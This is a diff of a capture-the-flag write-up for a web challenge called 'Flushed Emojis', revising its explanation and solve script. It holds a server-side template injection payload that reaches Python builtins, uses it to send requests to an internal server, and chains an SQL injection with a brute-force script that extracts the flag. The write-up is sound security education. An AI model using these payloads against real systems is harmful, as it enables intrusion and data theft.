@@ -4,7 +4,7 @@
 
 Flushed emojis are so cool! Learn more about them [here](http://litctf.live:31781/)!
 
-[FlushedEmojis.zip](https://drive.google.com/uc?export=download&id=1agW3a0-T4VsSJwJVTZ-dWSRLE_byxJya)
+[`FlushedEmojis.zip`](https://drive.google.com/file/d/1agW3a0-T4VsSJwJVTZ-dWSRLE_byxJya/view)
 
 ## Solution
 
@@ -44,7 +44,7 @@ Note that the code uses simple string concatenation for an SQL query. This is a 
 
 However, the method doesn't actually return the flag; it only returns `True` or `False`, depending on if the flag is matched by the query. This means we'll need to figure out the flag character-by-character, similar to [Amy The Hedgehog](Amy%20The%20Hedgehog.md).
 
-The second vulnerability is in the `main.py` file of the main server:
+Also, if we look in the `main.py` file of the main server, we see we can't use the code to directly send a request that would inject SQL into the data server, because the contents of our request are stripped to only alphanumeric characters before they're sent over. However, here we also find the second vulnerability:
 
 ```py
 # [irrelevant stuff]
@@ -89,7 +89,7 @@ Perfect! We'll be using a payload like this to get our flag. Now, it's time to g
 
 ### Getting the data server IP
 
-You'll notice in the main server code that the other server's IP is censored. Also, we can't use the code to directly send a request that would inject SQL into the data server, because the contents of our request are stripped to only alphanumeric characters before they're sent over. This means we'll have to figure out the data server IP so we can send requests there ourselves.
+You'll notice in the main server code that the other server's IP is censored. We'll have to it out so we can send requests there ourselves.
 
 Inspired by the payload above, we can type this into the `password` blank to read the contents of `main.py` (note the use of `'\x2e'` to bypass the `.` filter):
 
@@ -114,9 +114,7 @@ import requests
 r = requests.post("http://172.24.0.8:8080/runquery", json={"username":"","password":""})
 ```
 
-It times out, which means the only way we can inject SQL into the data server is via the main server.
-
-Since in the code, the request is stripped to alphanumeric before being sent over to the data server, we'll want to just use the template injection to send another request over:
+It times out, which means the only way we can inject SQL into the data server is via the main server. We'll want to just use the template injection to send another request (whose contents we fully control!) over:
 
 ```py
 {{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':''})['text']}}
@@ -130,19 +128,11 @@ ok thank you for your info i have now sold your password (False) for 2 donuts :)
 
 so sending the requests is working!
 
-Next, let's try some basic SQL injection:
+Next, let's try some basic SQL injection using `' OR '1'='1`:
 
 ```py
 {{request['application']['__globals__']['__builtins__']['__import__']('requests')['post']('http://172\x2e24\x2e0\x2e8:8080/runquery',json={'username':'','password':"' OR '1'='1"})['text']}}
 ```
-
-The data server should receive a blank username and a password of `' OR '1'='1`, which will be evaluated to
-
-```py
-cur.execute("SELECT * FROM users WHERE username='' AND password='' OR '1'='1'");
-```
-
-and since `AND` is evaluated before `OR`, the result should be `True`. Let's try inputting this payload into the `password` field:
 
 ```
 ok thank you for your info i have now sold your password (True) for 2 donuts :)
@@ -150,7 +140,7 @@ ok thank you for your info i have now sold your password (True) for 2 donuts :)
 
 Looking good!
 
-Finally, we can try actually figuring out the letters of the flag. In [Amy The Hedgehog](Amy%20The%20Hedgehog.md), we used the `LIKE` keyword to test if our guess was a prefix of the flag. Here, however, we found it more convenient to use the `SUBSTR` keyword to check individual characters of the flag, since `LIKE` is case-insensitive. (Also, some characters, like `_`, need to be escaped when using `LIKE`, which is annoying.)
+Finally, we can try actually figuring out the letters of the flag. In [Amy The Hedgehog](Amy%20The%20Hedgehog.md), we used the `LIKE` clause to test if our guess was a prefix of the flag. Here, however, we found it more convenient to use the `SUBSTR` function to check individual characters of the flag, since `LIKE` is case-insensitive. (Also, some characters, like `_`, need to be escaped when using `LIKE`, which is annoying.)
 
 For example, we know the first character of the flag is `L`. Let's check that using the `SUBSTR` function (note that SQL uses 1-indexed strings, rather than 0-indexed):
 
@@ -180,25 +170,27 @@ payload2 = ",1)='"
 payload3 = '''"})['text']}}''' # three sections of our payload
 
 i = 1 # the index we're starting from
+flag = "" # the portion we know
 
 while True:
     foundMatch = False # if we've found a match for this character
     for j in chars:
-        if j == '.': payload = payload1 + str(i) + payload2 + '\\x2e' + payload3 # make sure to circumvent the . filter!
-        else: payload = payload1 + str(i) + payload2 + j + payload3 # the full payload we're sending
+        jSafe = j
+        if j == '.': jSafe = '\\x2e' # make sure to circumvent the . filter!
+        payload = payload1 + str(i) + payload2 + jSafe + payload3 # the full payload we're sending
         r = requests.post('http://litctf.live:31781/', data={'username':'', 'password':payload}) # send payload to main server
         if r.text.find("True") != -1:
             # we found the correct character!
             print(f"Character at position {i} is {j}")
             foundMatch = True
             i += 1
+            flag += j
             break
     if not foundMatch:
         # we didn't find a match this iteration, so the flag must be done
         break
+print(flag)
 ```
-
-(If you get an error in the middle of the Python script, just modify `i` to be the index that it errored at and try again.)
 
 After some patience and restarts of the program, we get this:
 
@@ -228,12 +220,13 @@ Character at position 22 is o
 Character at position 23 is .
 Character at position 24 is 0
 Character at position 25 is }
+LITCTF{flush3d_3m0ji_o.0}
 ```
-
-...from which we can just read off our flag.
-
-*Fun fact:* In contest, we initially used `LIKE` instead of `SUBSTR`. Also, we forgot to circumvent the `.` filter in the Python solve script. These two mistakes combined made us solve the problem about 24 hours later than we should have.
 
 ## Flag
 
 `LITCTF{flush3d_3m0ji_o.0}`
+
+## Notes
+
+In contest, we initially used `LIKE` instead of `SUBSTR`. Also, we forgot to circumvent the `.` filter in the Python solve script. These two mistakes combined made us solve the problem about 24 hours later than we should have.
